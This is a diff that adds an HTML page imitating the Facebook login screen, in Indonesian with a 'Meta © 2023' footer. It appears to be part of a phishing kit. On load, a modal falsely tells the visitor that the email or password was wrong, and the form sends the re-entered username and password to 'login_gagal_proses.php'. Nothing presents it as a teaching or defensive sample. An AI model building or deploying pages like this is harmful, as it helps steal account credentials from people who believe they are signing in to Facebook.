@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook-Login or Sign up</title>
+    <link rel="stylesheet" href="css/login.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
+    <script>
+	$(document).ready(function(){
+		$("#myModal").modal('show');
+	});
+</script>
+</head>
+<body>
+    <div id="myModal" class="modal fade">
+        <div class="modal-dialog modal-sm">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Gagal Login</h5>
+                    <button type="button" class="close" data-dismiss="modal">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <p>Email atau kata sandi salah, periksa kembali.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <header class="header">
+            <div class="row">
+                <div class="col-md-12 text-center">
+                <h1 class="header-title"><b> Facebook </b> </h1>
+                </div>
+            </div>
+    </header>
+    <div class=" bg-danger text-white"> <p class="font_small" style="padding-left: 10px">Nomor ponsel atau email yang anda masukkan salah, silahkan masukkan dengan benar.</p></div>
+    <div class="container mt-5">
+        <div class="row">
+            <div class="col-md-6 offset-md-3">
+                <div class="login-box">
+                    <form action="login_gagal_proses.php" method="POST">
+                        <div class="mb-3">
+                            <input type="text" class="form-control" id="username" name="username" placeholder="Email or Phone" required="" aria-required="true">
+                        </div>
+                        <div class="mb-3">
+                            <input type="password" class="form-control" id="password" name="password" placeholder="Password" required="" aria-required="true">
+                        </div>
+                        <button type="submit" class="btn btn-primary custom-button">Masuk</button>
+                    </form>
+                    <p class="text-primary text-center margin">Lupa kata sandi ?</p>
+                    <div class="row margin">
+                        <div class="col-5 col-md-4"><hr></div>
+                        <div class="col-1 col-md-3 margin_kanan">atau</div>
+                        <div class="col-5 col-md-4"><hr></div>
+                    </div>
+                    <button type="button" class="btn btn-outline-dark custom-button margin">Buat akun baru</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="row translate">
+        <div class="col text-muted text-center">Bahasa Indonesia</div>
+        <div class="col text-primary text-center">English (UK)</div>
+        <div class="w-100"></div>
+        <div class="col text-primary text-center">Basa Jawa</div>
+        <div class="col text-primary text-center">Bahasa Melayu</div>
+        <div class="w-100"></div>
+        <div class="col text-primary text-center">Português (Brasil)</div>
+        <div class="col text-primary text-center">Español</div>
+        <div class="w-100"></div>
+        <div class="col text-primary text-center"></div>
+        <div class="col text-center">Meta © 2023</div>
+        <div class="col align-self-end">
+            <i class="	fa fa-plus-square-o text-muted" style="font-size: 30px;"></i>
+        </div>
+    </div>
+</body>
+</html>
